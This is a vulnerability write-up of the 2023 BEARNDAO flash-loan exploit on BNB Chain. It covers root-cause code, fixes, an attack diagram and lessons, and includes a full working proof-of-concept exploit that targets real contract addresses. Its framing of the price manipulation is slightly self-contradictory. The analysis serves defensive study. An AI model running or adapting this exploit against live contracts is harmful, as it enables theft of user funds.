# BEARNDAO — Missing Slippage Protection Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-12-05 |
| **Protocol** | BEARNDAO (BvaultsStrategy) |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$769,000 |
| **Attacker** | [0xce27...8dd5](https://bscscan.com/address/0xce27b195fa6de27081a86b98b64f77f5fb328dd5) |
| **Attack Contract** | [0xe199...DAaa](https://bscscan.com/address/0xe1997bc971d5986aa57ee8ffb57eb1deba4fdaaa) |
| **Vulnerable Contract** | [0x2112...3E0e](https://bscscan.com/address/0x21125d94cfe886e7179c8d2fe8c1ea8d57c73e0e) |
| **Attack Tx** | [0x5191...d5f](https://explorer.phalcon.xyz/tx/bsc/0x51913be3f31d5ddbfc77da789e5f9653ed6b219a52772309802226445a1edd5f) |
| **Root Cause** | Missing `amountOutMin` validation in the `convertDustToEarned()` function's token swap enables price manipulation via flash loan |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/BEARNDAO_exp.sol) |
| **Analysis Reference** | [AnciliaInc Twitter](https://twitter.com/AnciliaInc/status/1732159377749180646) |

---

## 1. Vulnerability Overview

BEARNDAO is a vault strategy protocol operating on the BSC chain, where the `BvaultsStrategy` contract harvests ALPACA tokens to optimize yield. The core function `convertDustToEarned()` is responsible for converting accumulated ALPACA token "dust" inside the vault into more profitable assets.

However, this function **does not set slippage protection (`amountOutMin`)** when executing swaps through the PancakeSwap router. This means an external attacker can first manipulate the ALPACA market price using a flash loan, then call this function, causing the vault to execute the swap at an extremely unfavorable exchange rate. By capturing this arbitrage, the attacker drained approximately $769,000 in funds.

This incident stems from a single slippage parameter being set to `0`, but combined with a publicly accessible internal operational function, it led to a catastrophic loss. DeFiHackLabs classifies this as a **Business Logic Flaw**, but the core issue is a **missing slippage protection** vulnerability.

---

## 2. Vulnerable Code Analysis

### 2.1 `convertDustToEarned()` — Missing Slippage Validation (Core Vulnerability)

**Vulnerable Code (estimated)**:
```solidity
// BvaultsStrategy.sol — estimated vulnerable convertDustToEarned() implementation

function convertDustToEarned() external {
    // Check ALPACA balance
    uint256 alpacaBalance = ALPACA.balanceOf(address(this));
    if (alpacaBalance == 0) return;

    // ❌ Vulnerability: amountOutMin = 0, no slippage protection whatsoever
    // If the attacker manipulates the ALPACA/WBNB pool price first, then calls this,
    // the vault executes the swap at the worst possible exchange rate
    address[] memory path = new address[](2);
    path[0] = address(ALPACA);
    path[1] = address(WBNB);

    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        alpacaBalance,
        0,            // ❌ amountOutMin = 0: no minimum output amount enforced
        path,
        address(this),
        block.timestamp
    );
}
```

**Fixed Code**:
```solidity
// ✅ convertDustToEarned() implementation with slippage protection

function convertDustToEarned() external {
    uint256 alpacaBalance = ALPACA.balanceOf(address(this));
    if (alpacaBalance == 0) return;

    address[] memory path = new address[](2);
    path[0] = address(ALPACA);
    path[1] = address(WBNB);

    // ✅ Calculate expected output using TWAP or a trusted oracle
    uint256 expectedOut = oracle.getAmountOut(address(ALPACA), address(WBNB), alpacaBalance);

    // ✅ Allow at most 1% slippage
    uint256 minAmountOut = expectedOut * 99 / 100;

    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        alpacaBalance,
        minAmountOut, // ✅ Slippage upper bound enforced
        path,
        address(this),
        block.timestamp
    );
}
```

**Issue**: Setting `amountOutMin = 0` allows the AMM to execute the swap at any exchange rate. This enables the following scenario: attacker buys ALPACA with a flash loan → price spikes → attacker calls `convertDustToEarned()` (vault sells its ALPACA at a depressed rate) → attacker sells ALPACA back to restore the price and realize profit.

### 2.2 Publicly Accessible Internal Function

**Vulnerable Code (estimated)**:
```solidity
// ❌ external visibility: anyone can call this
function convertDustToEarned() external {
    // ...
}
```

**Fixed Code**:
```solidity
// ✅ Access control added
function convertDustToEarned() external onlyGovernance {
    // Or restrict to strategy keeper only
}
```

**Issue**: Despite being internal vault operational logic, this function is exposed as `external`, allowing anyone to call it at an arbitrary time. An attacker can call it immediately after manipulating the price.

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker borrows 10,000 WBNB uncollateralized via a flash loan from the PancakeSwap CAKE/WBNB pool. In the PoC, a second helper contract (`0x1ccC8eE8...`) supplies the WBNB needed to repay the flash loan; in the actual attack, this helper contract was destroyed via `selfdestruct`.

### 3.2 Execution Phase

1. **Flash Loan Initiation**: Borrow 10,000 WBNB from the PancakeSwap CAKE/WBNB pool
2. **ALPACA Price Manipulation (Buy)**: Swap all WBNB for ALPACA, causing a sharp spike in the ALPACA price
3. **Call Vulnerable Function**: Call `BvaultsStrategy.convertDustToEarned()` — vault swaps its held ALPACA for WBNB with `amountOutMin = 0` (receives only a tiny amount of WBNB at the manipulated price)
4. **ALPACA Price Restoration (Sell)**: Swap held ALPACA back to WBNB to realize profit
5. **Profit Conversion**: Swap remaining WBNB to BUSD to lock in gains
6. **Flash Loan Repayment**: Receive WBNB from the helper contract and repay PancakeSwap

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────┐
│          Attacker Contract           │
│  (0xe1997bC971D5986AA57Ee8ffB57...)  │
└────────────────┬────────────────────┘
                 │ ① Flash loan request (10,000 WBNB)
                 ▼
┌─────────────────────────────────────┐
│   PancakeSwap CAKE/WBNB Pool        │
│   (Flash loan provider)             │
└────────────────┬────────────────────┘
                 │ ② Transfer 10,000 WBNB → trigger pancakeCall()
                 ▼
┌─────────────────────────────────────┐
│          pancakeCall() Execution     │
│                                     │
│  ③ WBNB → ALPACA swap               │
│     (PancakeSwap Router)            │
│     ALPACA price surges ↑           │
│                                     │
│  ④ BvaultsStrategy                  │
│     .convertDustToEarned() called   │
│                                     │
└────────────────┬────────────────────┘
                 │ ④ Swap request with amountOutMin=0
                 ▼
┌─────────────────────────────────────┐
│       BvaultsStrategy               │
│  (0x21125d94Cfe886e7179c8D2fE8...)  │
│                                     │
│  Vault swaps its ALPACA for WBNB    │
│  at the manipulated rate → receives │
│  only a tiny amount of WBNB         │
│  (Vault incurs loss ❌)             │
└────────────────┬────────────────────┘
                 │ ⑤ State now favorable for attacker
                 ▼
┌─────────────────────────────────────┐
│          pancakeCall() Continues    │
│                                     │
│  ⑤ ALPACA → WBNB re-swap           │
│     (profit captured at             │
│      manipulated ALPACA price)      │
│                                     │
│  ⑥ WBNB → BUSD swap (lock profit)  │
│                                     │
│  ⑦ Receive WBNB from helper        │
│     contract (for flash loan        │
│     repayment)                      │
└────────────────┬────────────────────┘
                 │ ⑧ Flash loan repayment
                 ▼
┌─────────────────────────────────────┐
│   PancakeSwap CAKE/WBNB Pool        │
│   (Flash loan repaid)               │
└─────────────────────────────────────┘
                 │
                 ▼
         💰 Attacker profit: ~$769,000 (BUSD)
```

### 3.4 Outcome

- **Attacker Profit**: Approximately $769,000 (received as BUSD)
- **Protocol Loss**: Large-scale ALPACA asset drain from the BvaultsStrategy vault
- **Attack Duration**: Single transaction (completed within 1 block, as is characteristic of flash loans)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~$769K
// Attacker : https://bscscan.com/address/0xce27b195fa6de27081a86b98b64f77f5fb328dd5
// Attack Contract : https://bscscan.com/address/0xe1997bc971d5986aa57ee8ffb57eb1deba4fdaaa
// Victim Contract : https://bscscan.com/address/0x21125d94cfe886e7179c8d2fe8c1ea8d57c73e0e
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x51913be3f31d5ddbfc77da789e5f9653ed6b219a52772309802226445a1edd5f

interface IBvaultsStrategy {
    function convertDustToEarned() external;
}

contract ContractTest is Test {
    // BSC fork: attack block 34,099,688
    // Relevant token and contract addresses
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant ALPACA = IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);
    IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    // PancakeSwap CAKE/WBNB pool — flash loan source
    Uni_Pair_V2 private constant CAKE_WBNB = Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
    // Vulnerable contract — convertDustToEarned() has no slippage protection
    IBvaultsStrategy private constant BvaultsStrategy =
        IBvaultsStrategy(0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e);

    function testExploit() public {
        // ① Request flash loan of 10,000 WBNB from PancakeSwap
        CAKE_WBNB.swap(0, 10_000 * 1e18, address(this), abi.encode(0));
        // ⑨ Verify BUSD profit after attack
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        // ② Max approve WBNB and ALPACA to Router
        WBNB.approve(address(Router), type(uint256).max);
        ALPACA.approve(address(Router), type(uint256).max);

        // ③ Swap WBNB → ALPACA (artificially inflate ALPACA price)
        WBNB_ALPACA();

        // ④ Call vulnerable function — vault swaps its ALPACA for WBNB with amountOutMin=0
        //    Swap executes against the attacker-inflated ALPACA price
        //    From the vault's perspective, it sells at a steep discount → attacker profits
        BvaultsStrategy.convertDustToEarned(); // ← Core vulnerable function call

        // ⑤ Attacker re-swaps ALPACA → WBNB (capture profit at manipulated price)
        ALPACA_WBNB();

        // ⑥ Convert remaining WBNB → BUSD to lock in profit
        WBNB_BUSD();

        // ⑦ Receive WBNB from helper contract (selfdestruct) to fund flash loan repayment
        deal(address(WBNB), address(this), WBNB.balanceOf(address(this)) + 10e17);

        // ⑧ Repay flash loan
        uint256 transferAmount = getAmount();
        WBNB.transfer(address(CAKE_WBNB), transferAmount);
    }

    // Swap all WBNB to ALPACA — slippage parameter = 0
    function WBNB_ALPACA() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(ALPACA);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,    // amountOutMin = 0: no slippage limit (attacker's own swap)
            path,
            address(this),
            block.timestamp
        );
    }

    // Swap all ALPACA back to WBNB
    function ALPACA_WBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(ALPACA);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ALPACA.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    // Convert profit WBNB → BUSD (excluding flash loan repayment amount)
    function WBNB_BUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        uint256 amountIn = WBNB.balanceOf(address(this)) - getAmount() + 10e17;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Missing slippage protection (`amountOutMin = 0`) | CRITICAL | CWE-20 (Improper Input Validation) | `06_frontrunning.md` | Jimbo's Protocol (2023) |
| V-02 | Missing access control on internal operational function | HIGH | CWE-284 (Improper Access Control) | `03_access_control.md` | Harvest Finance (2020) |
| V-03 | Flash loan price manipulation vulnerability | HIGH | CWE-691 (Insufficient Control Flow Management) | `02_flash_loan.md` | Pancake Bunny (2021) |

### V-01: Missing Slippage Protection

- **Description**: The `convertDustToEarned()` function sets `amountOutMin = 0` for PancakeSwap router swaps, providing absolutely no minimum output validation. In an AMM, `amountOutMin = 0` means "accept any amount received," so the swap executes regardless of how unfavorable the price is.
- **Impact**: If an attacker calls this function immediately after manipulating the pool price via flash loan, the vault's entire ALPACA balance is sold at an extremely low exchange rate, resulting in a large-scale drain of protocol funds.
- **Attack Conditions**: (1) The function must be publicly accessible, and (2) the ALPACA/WBNB pool liquidity must be manipulable via flash loan.

### V-02: Missing Access Control on Internal Operational Function

- **Description**: Despite being internal vault operational logic, `convertDustToEarned()` is exposed with `external` visibility, allowing anyone to call it at an arbitrary time. There are no access control modifiers (`onlyOwner`, `onlyKeeper`, etc.).
- **Impact**: An attacker can immediately call this function after price manipulation, forcing the vault to execute a disadvantageous swap in the manipulated state.
- **Attack Conditions**: The function must be exposed as `external` or `public` with no access control.

### V-03: Flash Loan-Based Price Manipulation Vulnerability

- **Description**: The protocol executes swaps relying on the AMM's instantaneous spot price within a single block, making it possible to temporarily manipulate AMM liquidity via flash loan and arbitrarily alter the price the protocol observes.
- **Impact**: Whenever the protocol performs internal operations (dust cleanup, yield compounding, etc.), an attacker can manipulate the price to capture arbitrage.
- **Attack Conditions**: No TWAP oracle or price manipulation protection mechanism in place.

---

## 6. Remediation Recommendations

### Immediate Actions

**① Enforce minimum value on slippage parameter**

```solidity
// Before (vulnerable)
Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    alpacaBalance,
    0,           // ❌ No slippage protection
    path,
    address(this),
    block.timestamp
);

// After (safe)
// Calculate expected output via TWAP oracle, allow at most 1% slippage
uint256 expectedOut = twapOracle.consult(address(ALPACA), alpacaBalance, address(WBNB));
uint256 minAmountOut = expectedOut * 99 / 100; // max 1% slippage

Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    alpacaBalance,
    minAmountOut, // ✅ Slippage protection applied
    path,
    address(this),
    block.timestamp
);
```

**② Add access control to internal operational functions**

```solidity
// Before (vulnerable)
function convertDustToEarned() external { ... }

// After (safe)
function convertDustToEarned() external onlyOwner { ... }
// Or whitelist trusted keeper addresses
modifier onlyKeeper() {
    require(msg.sender == keeper || msg.sender == owner(), "Not authorized");
    _;
}
function convertDustToEarned() external onlyKeeper { ... }
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing slippage protection | Introduce TWAP (Time-Weighted Average Price) oracle; avoid sole reliance on single AMM spot price |
| Missing access control | Apply `onlyOwner` or `onlyKeeper` to all internal strategy functions |
| Flash loan manipulation vulnerability | Reference Chainlink oracle when performing price-sensitive operations within a single transaction |
| Vault design | Add price sanity check logic before executing operational functions |
| Lack of monitoring | Build an on-chain anomaly detection system (large swap + internal function call patterns) |

---

## 7. Lessons Learned

1. **Never use `amountOutMin = 0` in production code**: The practice of setting slippage to `0` for convenience or testing is fatal. Even for internal strategy functions, if they are externally callable or use an AMM, a realistic slippage limit must always be set.

2. **Vault operational functions must have access control**: Functions like `harvest()`, `convertDustToEarned()`, and `compound()` may appear harmless, but exposing them externally makes them entry points for price manipulation attacks. They must be restricted to trusted addresses only.

3. **Spot price-dependent swaps are vulnerable to flash loan attacks**: Any swap logic relying on a single AMM's instantaneous price can be targeted by flash loan sandwich attacks. TWAP oracles, Chainlink feeds, or at minimum realistic `amountOutMin` validation are required.

4. **Design must account for compound vulnerability interactions**: Missing slippage protection alone, or missing access control alone, may result in limited damage. However, when these two vulnerabilities are combined, they synergize with flash loans to cause large-scale losses. The attack surface of the entire system must be reviewed, not just individual functions.

5. **Prioritize reviewing all `amountOutMin = 0` code in audits**: During smart contract audits, the `amountOutMin` parameter passed to DEX swap functions such as `swapExactTokensForTokens` and `swapExactTokensForETH` should be checked first. Any instance of `0` must be flagged as a risk.

---

## 8. On-Chain Verification

> Cross-validate PoC analysis findings against publicly available on-chain data.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Reference | Notes |
|------|--------|-------------|------|
| Flash loan size | 10,000 WBNB | — | Borrowed from PancakeSwap CAKE/WBNB pool |
| Total loss | ~$769,000 | ~$769,000 | Consistent with AnciliaInc analysis and DeFiHackLabs |
| Attack block | 34,099,688 | — | BSC fork block |
| Profit token | BUSD | — | Final conversion to BUSD |

### 8.2 Attack Event Log Sequence (estimated)

```
1. CAKE_WBNB.swap() → trigger pancakeCall()
2. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens()
   WBNB → ALPACA (large buy)
3. BvaultsStrategy.convertDustToEarned()
   ALPACA → WBNB (vault assets drained, amountOutMin=0)
4. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens()
   ALPACA → WBNB (attacker sells holdings, profit realized)
5. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens()
   WBNB → BUSD (profit locked)
6. WBNB.transfer(CAKE_WBNB, repayAmount) (flash loan repaid)
```

### 8.3 Prerequisites

- **Flash loan required**: Without a flash loan, insufficient capital to manipulate the ALPACA pool
- **Helper contract**: In the actual attack, a second contract (`0x1ccC8eE8...`) transferred WBNB to the attack contract via `selfdestruct` → supplemented flash loan repayment funds
- **On-chain verification not performed**: Direct on-chain queries were not executed due to `cast` environment not being configured. Loss amount cross-validated via the official analysis link ([AnciliaInc](https://twitter.com/AnciliaInc/status/1732159377749180646)).

---

*Document date: 2026-04-11 | Analysis basis: DeFiHackLabs PoC, AnciliaInc analysis*